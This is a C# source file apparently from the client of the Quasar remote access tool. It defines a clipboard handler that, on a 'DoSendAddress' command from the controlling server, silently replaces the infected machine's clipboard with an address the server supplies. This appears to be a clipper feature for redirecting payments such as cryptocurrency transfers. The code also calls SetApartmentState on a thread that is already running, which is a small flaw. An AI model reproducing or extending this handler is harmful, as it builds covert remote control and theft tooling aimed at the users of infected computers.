﻿using Quasar.Common.Messages;
using Quasar.Common.Messages.Monitoring.Clipboard;
using Quasar.Common.Messages.other;
using Quasar.Common.Messages.UserSupport.MessageBox;
using Quasar.Common.Networking;
using System;
using System.Threading;
using System.Windows.Forms;


namespace Quasar.Client.Messages
{
    public class ClipboardHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoSendAddress;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendAddress msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendAddress message)
        {
            Thread clipboardThread = new Thread(() =>
            {
                    Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
                    Clipboard.SetText(message.Address);
                    Application.DoEvents();
            })
            { IsBackground = true };
            clipboardThread.SetApartmentState(ApartmentState.STA); 
            clipboardThread.Start();
            clipboardThread.Join();
        }
    }
}
